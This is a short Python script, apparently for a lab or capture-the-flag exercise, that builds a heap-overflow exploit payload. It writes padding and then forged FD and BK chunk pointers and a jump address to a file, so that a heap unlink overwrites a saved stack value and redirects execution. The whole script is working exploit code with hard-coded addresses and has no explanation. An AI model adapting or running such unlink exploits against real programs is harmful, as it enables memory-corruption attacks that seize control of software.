import struct
import os

FILENAME = './A.txt'
A_STACK_ADDRESS = 0xff827af4
A_HEAP_ADDRESS = 0x9423570


def main():
	
	# unlink_return_address = A_STACK_ADDRESS - 24
	# A_buf = A_HEAP_ADDRESS + 8
	# A_assembly_buffer = struct.pack ('<H', 0xEB0E) 
	B_buf_address = A_HEAP_ADDRESS + 32 + 8 + 4
	ebp_minus4 = A_STACK_ADDRESS + 0x10
	
	FD = struct.pack ('<I', B_buf_address)
	BK = struct.pack ('<I', ebp_minus4)
	B_buf = struct.pack ('<I', 0x080484eb)

	payload = ''
	payload += 24 * 'A'
	payload += FD
	payload += BK
	payload += B_buf

	with open (FILENAME, 'w') as f:
		f.write (payload)

	print (payload)
	return

if __name__ == '__main__':
	main()